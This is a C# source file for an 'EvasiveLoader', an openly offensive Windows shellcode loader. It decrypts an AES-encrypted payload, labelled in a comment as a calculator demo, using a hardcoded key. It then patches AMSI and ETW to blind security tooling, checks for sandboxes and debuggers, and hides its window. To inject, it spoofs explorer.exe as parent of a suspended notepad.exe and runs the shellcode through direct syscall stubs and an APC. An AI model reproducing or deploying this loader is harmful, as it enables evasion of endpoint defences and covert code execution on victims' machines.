using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;



namespace EvasiveLoader
{
    class Program
    {
        // py3 .\encrypt_shellcode.py .\calc.bin 
        // [*] Read 276 bytes of shellcode from.\calc.bin
        // [*] Encrypted shellcode (288 bytes) written to.\calc.bin.enc
        private static readonly byte[] EncryptedPayload = new byte[288] {
                0x88, 0x20, 0x3E, 0x1A, 0xFA, 0xD5, 0x05, 0x60, 0x9E, 0xCC, 0x9C, 0x79, 0x35, 0x29, 0xAF, 0xDE,
                0xB9, 0x30, 0x3F, 0x11, 0x93, 0xF3, 0x1F, 0xFD, 0x39, 0xDA, 0x02, 0x53, 0x73, 0x8A, 0xC4, 0x4D,
                0xCC, 0x78, 0x64, 0x60, 0x5D, 0x72, 0xDC, 0x68, 0x3B, 0xA6, 0xC0, 0xA5, 0xF5, 0xE3, 0x31, 0xF5,
                0xCF, 0xD3, 0xE0, 0x8B, 0x3B, 0x20, 0xD5, 0x29, 0x9B, 0x79, 0xD8, 0x38, 0x2F, 0x5F, 0x3A, 0xD3,
                0xCB, 0xC7, 0x7D, 0x41, 0xB4, 0xD7, 0xB6, 0xB3, 0x93, 0x10, 0x23, 0x5E, 0x45, 0x70, 0x27, 0x41,
                0xDE, 0xB4, 0xFB, 0xD2, 0xD4, 0xCD, 0x91, 0xF9, 0x69, 0x58, 0x04, 0x02, 0x23, 0x79, 0x33, 0xB2,
                0x26, 0xDB, 0xDF, 0xA7, 0x22, 0x5C, 0xDC, 0x1B, 0x43, 0xD3, 0xCF, 0x03, 0x0C, 0x56, 0xD2, 0x8F,
                0x7F, 0x22, 0xFB, 0x93, 0xD9, 0x13, 0xEC, 0x7C, 0xA2, 0x11, 0x08, 0xC5, 0x94, 0x51, 0xD5, 0x06,
                0x95, 0xE6, 0x67, 0x7E, 0x43, 0x05, 0x2E, 0x3B, 0x41, 0xE5, 0x90, 0x78, 0xA4, 0x94, 0x4F, 0xEF,
                0x1E, 0x4C, 0xF1, 0x71, 0xF7, 0x82, 0x6B, 0xC1, 0x66, 0xAA, 0xEB, 0x2A, 0x6E, 0x41, 0xCB, 0x58,
                0xC0, 0x01, 0xB0, 0x20, 0x3C, 0x3F, 0xF3, 0xE8, 0x83, 0x26, 0x05, 0x27, 0xD3, 0xAF, 0x92, 0xE4,
                0x8E, 0x25, 0xA3, 0xEB, 0x71, 0xEA, 0x9A, 0xE6, 0xB7, 0x32, 0x87, 0x78, 0x7D, 0xCB, 0x1E, 0xC9,
                0x6C, 0x51, 0xA6, 0xC1, 0xA2, 0x3E, 0xB8, 0xC2, 0xE8, 0xF5, 0xDB, 0xAA, 0x24, 0x80, 0x4D, 0x6B,
                0xD9, 0xB8, 0x04, 0xCB, 0xF5, 0x77, 0x6C, 0x49, 0x46, 0x39, 0x42, 0x44, 0x46, 0xEA, 0x8D, 0x88,
                0x19, 0x46, 0x25, 0x21, 0xE6, 0x8E, 0x26, 0x11, 0x2A, 0x88, 0x76, 0x0B, 0x10, 0x61, 0x7D, 0x4A,
                0xC0, 0x38, 0x2E, 0xED, 0x4C, 0xF3, 0xBB, 0xA3, 0x25, 0x5C, 0xFE, 0x4F, 0x15, 0x16, 0xF2, 0x0A,
                0xD3, 0xCA, 0x50, 0xBA, 0x9A, 0x21, 0xA4, 0x37, 0x08, 0xD0, 0xEB, 0xFF, 0x43, 0xFE, 0x67, 0x76,
                0x86, 0x7F, 0x55, 0xE3, 0xCA, 0xFB, 0x4F, 0xBD, 0x66, 0x30, 0x63, 0x76, 0x7B, 0x2D, 0xB1, 0x6A
        };

        private static readonly byte[] AesKey = new byte[32] {
                0xF4, 0x06, 0x20, 0xF6, 0x2C, 0xB5, 0xDC, 0x49, 0x61, 0x4B, 0x93, 0xE3, 0x19, 0x31, 0xEA, 0xC6,
                0xC0, 0x50, 0x47, 0x63, 0x2C, 0x20, 0xE9, 0xA1, 0x9E, 0x17, 0x59, 0x44, 0x1A, 0xD0, 0x93, 0x95
        };

        private static readonly byte[] AesIv = new byte[16] {
                0x8A, 0x2F, 0x1D, 0x9D, 0xBB, 0x58, 0x28, 0x64, 0xDF, 0x02, 0xA2, 0x5E, 0x75, 0x45, 0x23, 0x26
        };


        private static byte[] AesDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform decryptor = aes.CreateDecryptor();
                return decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
            }
        }


        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [Flags]
        enum ProcessAccessFlags : uint
        {
            PROCESS_CREATE_PROCESS = 0x0080,
        }

        [Flags]
        enum AllocationType : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
        }

        [Flags]
        enum MemoryProtection : uint
        {
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_SUSPENDED = 0x00000004;
        const int SW_HIDE = 0;


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, uint dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessW(string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("ntdll.dll")]
        static extern uint NtAllocateVirtualMemoryFallback(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll")]
        static extern uint NtWriteVirtualMemoryFallback(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, IntPtr BufferLength, out IntPtr BytesWritten);

        [DllImport("ntdll.dll")]
        static extern uint NtProtectVirtualMemoryFallback(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll")]
        static extern uint NtQueueApcThreadFallback(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        [DllImport("ntdll.dll")]
        static extern uint NtResumeThreadFallback(IntPtr ThreadHandle, out uint SuspendCount);



        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtWriteVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, IntPtr BufferLength, out IntPtr BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtQueueApcThreadDelegate(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtResumeThreadDelegate(IntPtr ThreadHandle, out uint SuspendCount);


        private static IntPtr GetSyscallStub(string functionName)
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
                return IntPtr.Zero;

            IntPtr funcAddr = GetProcAddress(ntdll, functionName);
            if (funcAddr == IntPtr.Zero)
                return IntPtr.Zero;

            byte[] stub = new byte[24];
            Marshal.Copy(funcAddr, stub, 0, stub.Length);

            if (stub[0] != 0x4C || stub[1] != 0x8B || stub[2] != 0xD1 || stub[3] != 0xB8)
                return IntPtr.Zero;

            IntPtr stubAddr = VirtualAllocEx((IntPtr)(-1), IntPtr.Zero, (uint)stub.Length, AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
            if (stubAddr == IntPtr.Zero)
                return IntPtr.Zero;

            byte[] fullStub = new byte[stub.Length + 1];
            Array.Copy(stub, fullStub, stub.Length);
            fullStub[stub.Length] = 0xC3;

            Marshal.Copy(fullStub, 0, stubAddr, fullStub.Length);

            uint old;
            VirtualProtect(stubAddr, (UIntPtr)fullStub.Length, (uint)MemoryProtection.PAGE_EXECUTE_READ, out old);

            return stubAddr;
        }


        private static void PatchAmsi()
        {
            IntPtr amsi = GetModuleHandle("amsi.dll");
            if (amsi == IntPtr.Zero)
                return;

            IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            if (amsiScanBuffer == IntPtr.Zero)
                return;

            byte[] patch = Environment.Is64BitProcess
                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

            uint old;
            VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);
            VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, old, out _);
        }


        private static void PatchEtw()
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
                return;

            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
            if (etwEventWrite == IntPtr.Zero)
                return;

            byte[] patch = Environment.Is64BitProcess
                ? new byte[] { 0xC3 }
                : new byte[] { 0xC2, 0x14, 0x00 };

            uint old;
            VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, etwEventWrite, patch.Length);
            VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, old, out _);
        }


        private static bool SandboxDetected()
        {
            if (IsDebuggerPresent())
                return true;

            long tickStart = Environment.TickCount;
            Sleep(2000);
            long elapsed = Environment.TickCount - tickStart;
            if (elapsed < 1500)
                return true;

            string[] artifacts = { @"C:\agent\agent.pyw", @"C:\sandbox", @"C:\cuckoo" };
            foreach (string path in artifacts)
            {
                if (System.IO.File.Exists(path) || System.IO.Directory.Exists(path))
                    return true;
            }

            return false;
        }


        private static void HideConsole()
        {
            IntPtr hWnd = GetConsoleWindow();
            if (hWnd != IntPtr.Zero)
                ShowWindow(hWnd, SW_HIDE);
        }


        static void Main(string[] args)
        {
            HideConsole();

            if (!Environment.Is64BitProcess)
                return;

            bool skipSandbox = Array.Exists(args, a => a == "--skip-sandbox" || a == "-s");
            if (!skipSandbox && SandboxDetected())
                return;

            PatchAmsi();
            PatchEtw();

            byte[] shellcode;
            try
            {
                shellcode = AesDecrypt(EncryptedPayload, AesKey, AesIv);
            }
            catch
            {
                return;
            }

            if (shellcode == null || shellcode.Length == 0)
                return;

            IntPtr stubNtAllocate = GetSyscallStub("NtAllocateVirtualMemory");
            IntPtr stubNtWrite = GetSyscallStub("NtWriteVirtualMemory");
            IntPtr stubNtProtect = GetSyscallStub("NtProtectVirtualMemory");
            IntPtr stubNtQueueApc = GetSyscallStub("NtQueueApcThread");
            IntPtr stubNtResume = GetSyscallStub("NtResumeThread");

            NtAllocateVirtualMemoryDelegate NtAllocateVirtualMemory = stubNtAllocate != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(stubNtAllocate)
                : (NtAllocateVirtualMemoryDelegate)NtAllocateVirtualMemoryFallback;

            NtWriteVirtualMemoryDelegate NtWriteVirtualMemory = stubNtWrite != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtWriteVirtualMemoryDelegate>(stubNtWrite)
                : (NtWriteVirtualMemoryDelegate)NtWriteVirtualMemoryFallback;

            NtProtectVirtualMemoryDelegate NtProtectVirtualMemory = stubNtProtect != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtProtectVirtualMemoryDelegate>(stubNtProtect)
                : (NtProtectVirtualMemoryDelegate)NtProtectVirtualMemoryFallback;

            NtQueueApcThreadDelegate NtQueueApcThread = stubNtQueueApc != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtQueueApcThreadDelegate>(stubNtQueueApc)
                : (NtQueueApcThreadDelegate)NtQueueApcThreadFallback;

            NtResumeThreadDelegate NtResumeThread = stubNtResume != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtResumeThreadDelegate>(stubNtResume)
                : (NtResumeThreadDelegate)NtResumeThreadFallback;

            string targetProcess = @"C:\Windows\System32\notepad.exe";

            STARTUPINFOEX siEx = new STARTUPINFOEX();
            siEx.StartupInfo.cb = (uint)Marshal.SizeOf<STARTUPINFOEX>();
            PROCESS_INFORMATION pi;

            uint creationFlags = CREATE_SUSPENDED;
            IntPtr hParent = IntPtr.Zero;
            IntPtr lpAttributeList = IntPtr.Zero;

            try
            {
                Process[] explorers = Process.GetProcessesByName("explorer");
                if (explorers.Length > 0)
                {
                    hParent = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, (uint)explorers[0].Id);
                }

                if (hParent != IntPtr.Zero)
                {
                    IntPtr lpSize = IntPtr.Zero;
                    if (!InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize))
                    {
                        hParent = IntPtr.Zero;
                    }
                    else
                    {
                        lpAttributeList = Marshal.AllocHGlobal(lpSize);
                        if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize))
                        {
                            Marshal.FreeHGlobal(lpAttributeList);
                            lpAttributeList = IntPtr.Zero;
                        }
                        else
                        {
                            IntPtr pParent = Marshal.AllocHGlobal(IntPtr.Size);
                            Marshal.WriteIntPtr(pParent, hParent);

                            bool ok = UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, pParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                            Marshal.FreeHGlobal(pParent);

                            if (!ok)
                            {
                                DeleteProcThreadAttributeList(lpAttributeList);
                                Marshal.FreeHGlobal(lpAttributeList);
                                lpAttributeList = IntPtr.Zero;
                            }
                        }
                    }
                }
            }
            catch
            {
                if (lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(lpAttributeList);
                    Marshal.FreeHGlobal(lpAttributeList);
                    lpAttributeList = IntPtr.Zero;
                }
                if (hParent != IntPtr.Zero)
                {
                    CloseHandle(hParent);
                    hParent = IntPtr.Zero;
                }
            }

            if (lpAttributeList != IntPtr.Zero)
            {
                siEx.lpAttributeList = lpAttributeList;
                creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
            }

            StringBuilder cmdline = new StringBuilder(targetProcess);
            bool created = CreateProcessW(null, cmdline, IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, null, ref siEx, out pi);

            if (lpAttributeList != IntPtr.Zero)
            {
                DeleteProcThreadAttributeList(lpAttributeList);
                Marshal.FreeHGlobal(lpAttributeList);
            }
            if (hParent != IntPtr.Zero)
            {
                CloseHandle(hParent);
            }

            if (!created)
                return;

            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            uint status = NtAllocateVirtualMemory(pi.hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, (uint)(AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE), (uint)MemoryProtection.PAGE_READWRITE);
            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            IntPtr shellcodePtr = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, shellcodePtr, shellcode.Length);

            IntPtr bytesWritten;
            status = NtWriteVirtualMemory(pi.hProcess, baseAddr, shellcodePtr, (IntPtr)shellcode.Length, out bytesWritten);

            Marshal.FreeHGlobal(shellcodePtr);

            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            IntPtr protectAddr = baseAddr;
            IntPtr protectSize = (IntPtr)shellcode.Length;
            uint oldProtect;
            status = NtProtectVirtualMemory(pi.hProcess, ref protectAddr, ref protectSize, (uint)MemoryProtection.PAGE_EXECUTE_READ, out oldProtect);
            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            status = NtQueueApcThread(pi.hThread, baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            uint suspendCount;
            status = NtResumeThread(pi.hThread, out suspendCount);
            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Sleep(1000);
        }
    }
}